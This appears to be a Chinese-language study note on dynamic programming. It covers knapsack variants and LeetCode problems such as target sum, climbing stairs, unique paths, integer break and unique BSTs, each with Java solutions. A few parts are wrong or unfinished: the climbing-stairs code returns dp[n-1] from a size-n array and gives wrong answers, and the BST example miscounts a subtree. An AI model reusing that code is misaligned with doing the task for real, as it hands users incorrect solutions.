<p>给定 n ，请计算 F(n) 。</p>
<p><strong>动态规划思路</strong><br>按步骤：</p>
<ol>
<li>确定dp数组（dp table）以及下标的含义<blockquote>
<p>dp[i]的定义为：第i个数的斐波那契数值是dp[i]</p>
</blockquote>
</li>
<li>确定递推公式（状态转移公式）<code>递推公式决定了dp数组要如何初始化！</code><blockquote>
<p>状态转移方程 dp[i] &#x3D; dp[i - 1] + dp[i - 2];</p>
</blockquote>
</li>
<li>dp数组如何初始化<blockquote>
<p>dp[0] &#x3D; 0;<br>dp[1] &#x3D; 1;</p>
</blockquote>
</li>
<li>确定遍历顺序<blockquote>
<p>从递归公式dp[i] &#x3D; dp[i - 1] + dp[i - 2];中可以看出，dp[i]是依赖 dp[i - 1] 和 dp[i - 2]，那么遍历的顺序一定是从前到后遍历的(2-&gt;i)</p>
</blockquote>
</li>
<li>举例推导dp数组</li>
</ol>
<p><strong>代码</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">fib</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (n == <span class="number">0</span> || n == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> n;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span>[] dp = <span class="keyword">new</span> <span class="title class_">int</span>[n + <span class="number">1</span>];</span><br><span class="line">    dp[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    dp[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">2</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        dp[i] = dp[i - <span class="number">1</span>] + dp[i - <span class="number">2</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[n];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h3 id="典型-01背包问题"><a href="#典型-01背包问题" class="headerlink" title="[典型] 01背包问题"></a>[典型] 01背包问题</h3><p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240929153659.png" alt="常见背包问题"></p>
<p>判断一个问题是否可以使用背包问题解决，可以考虑以下几点：</p>
<ol>
<li><strong>资源限制</strong>：是否有一个容量限制（如背包的最大承载量）？</li>
<li><strong>选择策略</strong>：是否存在一组物品可供选择，每个物品有特定的价值和重量？</li>
<li><strong>优化目标</strong>：是否需要在满足约束条件下最大化或最小化某个目标（如总价值或总重量）？</li>
<li><strong>组合选择</strong>：是否需要考虑不同物品的组合选择方式（如选取数量、可重复选择等）？</li>
</ol>
<p><strong>递推公式</strong></p>
<ol>
<li>求装满背包有几种方法，公式都是：<code>dp[j] += dp[j - nums[i]]</code>;</li>
<li></li>
</ol>
<p><strong>思路：</strong></p>
<ol>
<li>确定dp数组（dp table）以及下标的含义</li>
</ol>
<blockquote>
<p>在本题中有两个维度，分别是物品所占的空间和物品的价值，因此采用二维数组</p>
<p>i 来表示物品、j表示背包容量。dp[i][j] 表示从下标为[0-i]的物品里任意取，放进容量为j的背包，价值总和最大是多少。</p>
</blockquote>
<ol start="2">
<li>确定递推公式（状态转移公式）<code>递推公式决定了dp数组要如何初始化！</code></li>
</ol>
<blockquote>
<p>当考虑dp[i][j]时，有两种情况：</p>
<ol>
<li>不放物品  i : 在此情况下，能放的价值就是考虑到 i-1 时能放下的最大价值。</li>
<li>放物品 i :  在此情况下，首先要腾出能容纳此物品的空间，然后再考虑 考虑到物品 i-1 时 腾出此空间后剩余空间能放的最大价值。</li>
</ol>
<p>状态转移方程 dp[i][j] &#x3D; max(dp[i - 1][j], dp[i - 1][j - spaces[i]] + values[i]);</p>
</blockquote>
<ol start="3">
<li>dp数组如何初始化</li>
</ol>
<blockquote>
<ol>
<li><p>背包容量为0 时存放的最大价值也必然为0</p>
</li>
<li><p>必须初始化i &#x3D; 0（物品0）时的最大价值在迭代时才能使用 i-1;而只有背包容量大于物品0所占空间时才能放得下物品0.</p>
</li>
</ol>
</blockquote>
<ol start="4">
<li><p>确定遍历顺序</p>
</li>
<li><p>举例推导dp数组</p>
</li>
</ol>
<p>  <img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240926010022.png" alt="示例"></p>
<blockquote>
<p>如，当容量为4，三个物品，其价值分别为15，20，30；所占空间为1，3，4时：</p>
<table>
<thead>
<tr>
<th>i&#x2F;j</th>
<th>0</th>
<th>1</th>
<th>2</th>
<th>3</th>
<th>4</th>
</tr>
</thead>
<tbody><tr>
<td>物品0</td>
<td>0</td>
<td>15</td>
<td>15</td>
<td>15</td>
<td>15</td>
</tr>
<tr>
<td>物品1</td>
<td>0</td>
<td>15</td>
<td>15</td>
<td>20</td>
<td>35</td>
</tr>
<tr>
<td>物品2</td>
<td>0</td>
<td>15</td>
<td>15</td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>当考虑到物品1，容量为4 时，假设我们选择放入物品1，则背包需要腾出3的空间，剩余空间也就是 j - spaces[1]。在背包空间为 j-spaces[1] 的情况下，能放的最大价值也就是[i-1][-spaces[1]]，也就是15了。此时能放的最大价值也就是 20 + 15 &#x3D; 35</p>
</blockquote>
<p>解法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">** N:背包容量</span></span><br><span class="line"><span class="comment">** len: 物品总数</span></span><br><span class="line"><span class="comment">**/</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">findMaxValueInBag</span><span class="params">(<span class="type">int</span> N,<span class="type">int</span> len,<span class="type">int</span>[] spaces,<span class="type">int</span>[] values)</span>&#123;</span><br><span class="line">    <span class="type">int</span>[][] dp = <span class="keyword">new</span> <span class="title class_">int</span>[len][N+<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> spaces[<span class="number">0</span>];i&lt;=N;i++)&#123;</span><br><span class="line">        dp[<span class="number">0</span>][i] = values[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; len; i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt;= N; j++)&#123;</span><br><span class="line">			<span class="keyword">if</span>(j&lt;spaces[i])&#123;</span><br><span class="line">                dp[i][j] = dp[i-<span class="number">1</span>][j];</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                dp[i][j] = Math.max(dp[i-<span class="number">1</span>][j],dp[i-<span class="number">1</span>][j - spaces[i]] + values[i]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[len-<span class="number">1</span>][N];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 改进 使用一维数组</span></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">findMaxValueInBag</span><span class="params">(<span class="type">int</span> N,<span class="type">int</span> len,<span class="type">int</span>[] spaces,<span class="type">int</span>[] values)</span>&#123;</span><br><span class="line">    <span class="type">int</span>[] dp = <span class="keyword">new</span> <span class="title class_">int</span>[N+<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        <span class="comment">// 内层循环从 N 空间逐渐减少到当前研究材料所占空间</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> N; j &gt;= spaces[i]; j--) &#123;</span><br><span class="line">            <span class="comment">// 考虑当前研究材料选择和不选择的情况，选择最大值</span></span><br><span class="line">            dp[j] = Math.max(dp[j], dp[j - spaces[i]] + values[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[N];</span><br></pre></td></tr></table></figure>

<p>【注意】：改用一维数组时，</p>
<ol>
<li>需要从大到小遍历，以<strong>保证物品 i 只被放入一次</strong></li>
<li><em>先遍历物品嵌套遍历背包容量，</em></li>
</ol>
<h3 id="典型-完全背包问题"><a href="#典型-完全背包问题" class="headerlink" title="[典型]完全背包问题"></a>[典型]<a href="https://kamacoder.com/problempage.php?pid=1052">完全背包问题</a></h3><p>完全背包问题的特点：</p>
<ol>
<li>每种物品可以选择任意次数，可以无限使用同一种物品</li>
<li>与01背包问题的主要区别在于遍历顺序，从小到大遍历，使得物品 i 可以放尽可能多次</li>
<li>遍历物品或背包容量先都可以</li>
</ol>
<p><strong>【题目】</strong></p>
<p>有N件物品和一个最多能背重量为W的背包。第i件物品的重量是weight[i]，得到的价值是value[i] 。<strong>每件物品都有无限个（也就是可以放入背包多次）</strong>，求解将哪些物品装入背包里物品价值总和最大。</p>
<p><strong>【思路】</strong></p>
<p>对于当前容量 <code>j</code>，我们有两个选择：</p>
<ul>
<li>不选择当前物品：保持 <code>dp[j]</code> 的值。</li>
<li>选择当前物品：则能获得 <code>dp[j - weight[i]] + value[i]</code> 的价值。</li>
</ul>
<p>取这两个选择中的较大值，更新 <code>dp[j]</code></p>
<p><strong>【题解】</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">findMaxValue</span><span class="params">(<span class="type">int</span>[] weight,<span class="type">int</span>[] value,<span class="type">int</span> V,<span class="type">int</span> len)</span>&#123;</span><br><span class="line">    <span class="type">int</span>[] dp = <span class="keyword">new</span> <span class="title class_">int</span>[V+<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;i&lt;len;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=weight[i];j&lt;=V;j++)&#123;</span><br><span class="line">            dp[j] = Math.max(dp[j],dp[j-weight[i]]+value[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[V];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 容易理解的二维数组版本，但不推荐。</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">findMaxValue</span><span class="params">(<span class="type">int</span>[] weight, <span class="type">int</span>[] value, <span class="type">int</span> V, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="type">int</span>[][] dp = <span class="keyword">new</span> <span class="title class_">int</span>[len + <span class="number">1</span>][V + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt;= len; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt;= V; j++) &#123;</span><br><span class="line">            <span class="comment">// 不选择当前物品</span></span><br><span class="line">            dp[i][j] = dp[i - <span class="number">1</span>][j];</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 选择当前物品，若容量足够</span></span><br><span class="line">            <span class="keyword">if</span> (j &gt;= weight[i - <span class="number">1</span>]) &#123;</span><br><span class="line">                dp[i][j] = Math.max(dp[i][j], dp[i][j - weight[i - <span class="number">1</span>]] + value[i - <span class="number">1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[len][V];</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p><strong>【完全背包问题总结】</strong></p>
<p>关于遍历顺序：</p>
<ol>
<li><strong>如果求组合数就是外层for循环遍历物品，内层for遍历背包</strong>。</li>
<li><strong>如果求排列数就是外层for遍历背包，内层for循环遍历物品</strong>。</li>
<li>其他问题，无所谓遍历顺序</li>
</ol>
<p>关于递推公式：</p>
<ol>
<li>装满背包有几种可能，就一定是<code>dp\[j] += dp[j-weight[i]]</code></li>
</ol>
<h3 id="典型01背包-494-目标和"><a href="#典型01背包-494-目标和" class="headerlink" title="[典型01背包] 494. 目标和"></a>[典型01背包] <a href="https://leetcode.cn/problems/target-sum/">494. 目标和</a></h3><p>给你一个非负整数数组 <code>nums</code> 和一个整数 <code>target</code> 。向数组中的每个整数前添加 <code>&#39;+&#39;</code> 或 <code>&#39;-&#39;</code> ，然后串联起所有整数，可以构造一个 <strong>表达式</strong> ：</p>
<ul>
<li>例如，<code>nums = [2, 1]</code> ，可以在 <code>2</code> 之前添加 <code>&#39;+&#39;</code> ，在 <code>1</code> 之前添加 <code>&#39;-&#39;</code> ，然后串联起来得到表达式 <code>&quot;+2-1&quot;</code> 。</li>
</ul>
<p>返回可以通过上述方法构造的、运算结果等于 <code>target</code> 的不同 <strong>表达式</strong> 的数目。</p>
<p><strong>思路:</strong></p>
<p>​	假设加法和为<code>X</code>,则减法和为<code>sum-x</code>，满足条件即为 <code>x-(sum-x) = target</code>，因此<code>x = (target+sum)/2</code>，因为数据元素均为整数，因此他们的和也必须是整数，既有<code>x</code>为整数： <code>(target+sum)%2==0</code>，</p>
<ol>
<li><p>确定dp数组（dp table）以及下标的含义</p>
<blockquote>
<p>dp[i][j] 表示考虑到第i个物品时填满容量为j的包有几种可能</p>
</blockquote>
</li>
<li><p>确定递推公式（状态转移公式）<code>递推公式决定了dp数组要如何初始化！</code></p>
<blockquote>
<p>考虑第i个物品和容量j的背包时，有两种可能</p>
<ol>
<li>放第i物品：则此种情况下能够填满的情况就是填满容量为 dp[i][j-num[i]]的背包的情况</li>
<li>不放第i物品：则此种情况就是i-1时的情况。</li>
<li>dp[i][j] &#x3D; dp[i-1][j]+ dp[i][j-num[i]], j&gt;num[i]</li>
</ol>
</blockquote>
</li>
<li><p>dp数组如何初始化</p>
<blockquote>
<ol>
<li><p>背包容量为0 ,不放任何东西即可填满，因此第一列均为1</p>
</li>
<li><p>当背包容量恰为num[i]时至少有一种可能</p>
</li>
</ol>
</blockquote>
</li>
</ol>
<p><strong>题解：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">findTargetSumWays</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> target)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nums.length; i++) sum += nums[i];</span><br><span class="line"></span><br><span class="line">    <span class="comment">//如果target的绝对值大于sum，那么是没有方案的</span></span><br><span class="line">    <span class="keyword">if</span> (Math.abs(target) &gt; sum) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//如果(target+sum)除以2的余数不为0，也是没有方案的</span></span><br><span class="line">    <span class="keyword">if</span> ((target + sum) % <span class="number">2</span> == <span class="number">1</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> <span class="variable">bagSize</span> <span class="operator">=</span> (target + sum) / <span class="number">2</span>;</span><br><span class="line">    <span class="type">int</span>[] dp = <span class="keyword">new</span> <span class="title class_">int</span>[bagSize + <span class="number">1</span>];</span><br><span class="line">    dp[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> bagSize; j &gt;= nums[i]; j--) &#123;</span><br><span class="line">            dp[j] += dp[j - nums[i]];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> dp[bagSize];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="典型-多重背包问题"><a href="#典型-多重背包问题" class="headerlink" title="[典型] 多重背包问题"></a>[典型] 多重背包问题</h3><p>多重背包问题的特点：</p>
<ol>
<li><p>有N种物品和一个容量为V 的背包。<strong>第i种物品最多有Mi件可用</strong>，每件耗费的空间是Ci ，价值是Wi 。</p>
<blockquote>
<p>每件物品最多有Mi件可用，把Mi件摊开，其实就是一个01背包问题了。</p>
</blockquote>
</li>
</ol>
<p>【题目】</p>
<p><a href="https://kamacoder.com/problempage.php?pid=1066">携带矿石资源</a></p>
<p>【思路】</p>
<p>遍历容量时，必须从大往小遍历，否则小容量会影响大容量，如</p>
<blockquote>
<p>maxSize:10 len 3<br>weight:1 3 4<br>value: 15 20 30<br>nums:  2 3 2</p>
</blockquote>
<p>若从小到大遍历，当考虑第一个物品，容量为3时，k&#x3D;2,则j-k*weight[i] &#x3D; 3-2*1 &#x3D; 1，也就是说dp[3] &#x3D; max(0,dp[1]+2*15)，而此时的dp[1]等于15是因为放了一个物品0导致的，若想dp[3]&#x3D;45需要3个物品0，但实际上只有两个物品0.</p>
<p>【题解】</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">findMaxValue</span><span class="params">(<span class="type">int</span>[] weight,<span class="type">int</span>[] value,<span class="type">int</span>[] nums,<span class="type">int</span> maxSize,<span class="type">int</span> len)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span>[] dp = <span class="keyword">new</span> <span class="title class_">int</span>[maxSize+<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;len;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=maxSize;j&gt;=weight[i];j--)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">k</span> <span class="operator">=</span> <span class="number">1</span>;k &lt;= nums[i]&amp;&amp; (j-k*weight[i])&gt;=<span class="number">0</span>;k++)&#123;</span><br><span class="line">                dp[j] = Math.max(dp[j],dp[j-k*weight[i]]+k*value[i]);          </span><br><span class="line">            &#125; </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> dp[maxSize];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>











<h3 id="70-爬楼梯"><a href="#70-爬楼梯" class="headerlink" title="70 爬楼梯"></a>70 爬楼梯</h3><p>假设你正在爬楼梯。需要 n 阶你才能到达楼顶。每次你可以爬 1 或 2 个台阶。你有多少种不同的方法可以爬到楼顶呢</p>
<p><strong>思路</strong><br>从上一台阶到当前台阶，只有两种可能，无非从低一个台阶走1步或从低两个台阶走2步；因此到前一个台阶后只有再走一步才会到当前台阶，因此到前一个台阶的可能和到前一个台阶后走一步到当前台阶的可能是一样的，同理，<br>count(n)&#x3D;count(n-1)+count(n-2)</p>
<p><strong>动态规划思路</strong><br>按步骤：</p>
<ol>
<li>确定dp数组（dp table）以及下标的含义<blockquote>
<p>dp[i]的定义为：到第i层有dp[i]种不同方法</p>
</blockquote>
</li>
<li>确定递推公式（状态转移公式）<code>递推公式决定了dp数组要如何初始化！</code><blockquote>
<p>状态转移方程 dp[i] &#x3D; dp[i - 1] + dp[i - 2];</p>
</blockquote>
</li>
<li>dp数组如何初始化<blockquote>
<p>dp[0] &#x3D; 0;<br>dp[1] &#x3D; 1;<br>dp[2] &#x3D; 2;</p>
</blockquote>
</li>
<li>确定遍历顺序<blockquote>
<p>从递归公式dp[i] &#x3D; dp[i - 1] + dp[i - 2];中可以看出，dp[i]是依赖 dp[i - 1] 和 dp[i - 2]，那么遍历的顺序一定是从前到后遍历的(2-&gt;i)</p>
</blockquote>
</li>
<li>举例推导dp数组</li>
</ol>
<p><strong>代码</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(n == <span class="number">0</span> || n == <span class="number">1</span> || n == <span class="number">2</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span>[] dp = <span class="keyword">new</span> <span class="title class_">int</span>[n];</span><br><span class="line">dp[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">dp[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">dp[<span class="number">2</span>] = <span class="number">2</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">3</span>;i&lt;n;i++)&#123;</span><br><span class="line">    dp[i] = dp[i-<span class="number">1</span>] + dp[i-<span class="number">2</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> dp[n-<span class="number">1</span>];</span><br></pre></td></tr></table></figure>


<h3 id="746-使用最小花费爬楼梯"><a href="#746-使用最小花费爬楼梯" class="headerlink" title="746 使用最小花费爬楼梯"></a>746 使用最小花费爬楼梯</h3><p>给你一个整数数组 cost ，其中 cost[i] 是从楼梯第 i 个台阶向上爬需要支付的费用。一旦你支付此费用，即可选择向上爬一个或者两个台阶。你可以选择从下标为 0 或下标为 1 的台阶开始爬楼梯。s请你计算并返回达到楼梯顶部的最低花费</p>
<p><strong>思路</strong><br>当前楼层只能从前1层或前2层到达，因此只需要挑选出花费最小的路径即可。</p>
<p><strong>动态规划思路</strong></p>
<ol>
<li>确定dp数组（dp table）以及下标的含义<blockquote>
<p>dp[i]的定义为：到第i层最少花费dp[i];</p>
</blockquote>
</li>
<li>确定递推公式（状态转移公式）<code>递推公式决定了dp数组要如何初始化！</code><blockquote>
<p>状态转移方程 dp[i] &#x3D; min(dp[i - 1] + cost[i - 1], dp[i - 2] + cost[i - 2]);</p>
</blockquote>
</li>
<li>dp数组如何初始化<blockquote>
<p>dp[0] &#x3D; 0;<br>dp[1] &#x3D; 0;</p>
</blockquote>
</li>
<li>确定遍历顺序<blockquote>
<p>从递归公式dp[i] &#x3D; dp[i - 1] + dp[i - 2];中可以看出，dp[i]是依赖 dp[i - 1] 和 dp[i - 2]，那么遍历的顺序一定是从前到后遍历的(2-&gt;i)</p>
</blockquote>
</li>
<li>举例推导dp数组</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">minCostClimbingStairs</span><span class="params">(<span class="type">int</span>[] cost)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> cost.length;</span><br><span class="line">    <span class="type">int</span>[] dp = <span class="keyword">new</span> <span class="title class_">int</span>[len+<span class="number">1</span>];</span><br><span class="line">    dp[<span class="number">0</span>] = dp[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">2</span>;i&lt;=len;i++)&#123;</span><br><span class="line">        dp[i] = Math.min(dp[i-<span class="number">1</span>]+cost[i-<span class="number">1</span>],dp[i-<span class="number">2</span>]+cost[i-<span class="number">2</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[len];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h3 id="62-不同路径"><a href="#62-不同路径" class="headerlink" title="62 不同路径"></a>62 不同路径</h3><p>一个机器人位于一个 m x n 网格的左上角 （起始点在下图中标记为 “Start” ）。机器人每次<code>只能向下或者向右移动</code>一步。机器人试图达到网格的右下角（在下图中标记为 “Finish” ）。问总共有多少条不同的路径？</p>
<p><strong>动态规划思路</strong></p>
<ol>
<li>确定dp数组（dp table）以及下标的含义<blockquote>
<p>dp[i][j]的定义为：到[i][j]的格有几种路径;</p>
</blockquote>
</li>
<li>确定递推公式（状态转移公式）<code>递推公式决定了dp数组要如何初始化！</code><blockquote>
<p>当前格只可能从左格和上格到<br>状态转移方程 dp[i][j] &#x3D; dp[i - 1][j] + dp[i][j - 1];</p>
</blockquote>
</li>
<li>dp数组如何初始化<br>第一行和第一列都必是1</li>
<li>确定遍历顺序</li>
<li>举例推导dp数组</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span>[][] dp = <span class="keyword">new</span> <span class="title class_">int</span>[m][n];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">    dp[<span class="number">0</span>][i] = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; m; i++) &#123;</span><br><span class="line">    dp[i][<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; m; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">1</span>; j &lt; n; j++) &#123;</span><br><span class="line">        dp[i][j] = dp[i-<span class="number">1</span>][j]+dp[i][j-<span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> dp[m-<span class="number">1</span>][n-<span class="number">1</span>];</span><br></pre></td></tr></table></figure>


<h3 id="343-整数拆分"><a href="#343-整数拆分" class="headerlink" title="343 整数拆分"></a>343 整数拆分</h3><p>给定一个正整数 n ，将其拆分为 k 个 正整数 的和（ k &gt;&#x3D; 2 ），并使这些整数的乘积最大化。返回 你可以获得的最大乘积 </p>
<p>思路：</p>
<ol>
<li>确定dp数组（dp table）以及下标的含义<blockquote>
<p>dp[i]的定义为：数i分解后的最大乘积</p>
</blockquote>
</li>
<li>确定递推公式（状态转移公式）<code>递推公式决定了dp数组要如何初始化！</code><blockquote>
<p>dp[i]可能从两种途径得到<br>一个是j * (i - j) 直接相乘。<br>一个是j * dp[i - j]，相当于是拆分(i - j)，对这个拆分不理解的话，可以回想dp数组的定义。<br>状态转移方程 dp[i] &#x3D; Math.max(dp[i],Math.max(j*(i-j),j*dp[i-j]));</p>
</blockquote>
</li>
<li>dp数组如何初始化<br>从2开始才能分隔</li>
<li>确定遍历顺序</li>
<li>举例推导dp数组</li>
</ol>
<p>解法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">integerBreak</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">    <span class="type">int</span>[] dp = <span class="keyword">new</span> <span class="title class_">int</span>[n+<span class="number">1</span>];</span><br><span class="line">    dp[<span class="number">2</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">3</span>;i&lt;= n;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">2</span>;j&lt;i;j++)&#123;</span><br><span class="line">            dp[i] = Math.max(dp[i],Math.max(j*(i-j),j*dp[i-j]));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[n];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h3 id="96-不同的二叉搜索树"><a href="#96-不同的二叉搜索树" class="headerlink" title="96 不同的二叉搜索树"></a>96 不同的二叉搜索树</h3><p>给你一个整数 n ，求恰由 n 个节点组成且节点值从 1 到 n 互不相同的<strong>二叉搜索树</strong>有多少种？返回满足题意的二叉搜索树的种数。</p>
<p>思路：<br>首先需要注意的是这是求二叉搜索树，所以左子节点必小于根节点，右子结点必须大于等于根节点。</p>
<ol>
<li>确定dp数组（dp table）以及下标的含义<blockquote>
<p>dp[i]的定义为：</p>
</blockquote>
</li>
<li>确定递推公式（状态转移公式）<code>递推公式决定了dp数组要如何初始化！</code><blockquote>
<p>对于第i个节点，需要考虑1作为根节点直到i作为根节点的情况，所以需要累加<br>一共i个节点，对于根节点j时,左子树的节点个数为j-1，右子树的节点个数为i-j<br>状态转移方程 dp[i] +&#x3D; dp[j - 1] * dp[i - j];   j: 1-&gt;i-1</p>
</blockquote>
</li>
<li>dp数组如何初始化<br>第一行和第一列都必是1</li>
<li>确定遍历顺序</li>
<li>举例推导dp数组<blockquote>
<p>当n &#x3D; 5时，可以有：</p>
<p>如果根节点为 1，那么：左子树只能有0个结点，右子树必定有 3 个结点.</p>
<p>……</p>
<p>如果根结点为 3，那么：左子树只能有 2 个结点，右子树必定有 2 个结点。此情况下，对于其左右子树，同样有：</p>
<p>​	对于左子树：若根节点为 1，则 左子树只能有 0 个结点，右子树必定有 1 个结点。</p>
<p>​				 若根节点为 2，则 左子树只能有 1 个结点，右子树必定有 0 个结点。</p>
<p>​	对于右子树：若根节点为 4，则 左子树只能有 0 个结点，右子树必定有 1 个结点。</p>
<p>​				 若根节点为 5，则 左子树只能有 1 个结点，右子树必定有 0 个结点。         </p>
<p>​	以上情况与n&#x3D;2，根节点分别为1，2时完全对应。因此根节点为3的情况下存在**dp[2]*dp[2]**种树</p>
<p>…….</p>
<p>所以dp[n] &#x3D; dp[0]dp[n-1] + dp[1]dp[n-2]+…+dp[n-1]dp[0];</p>
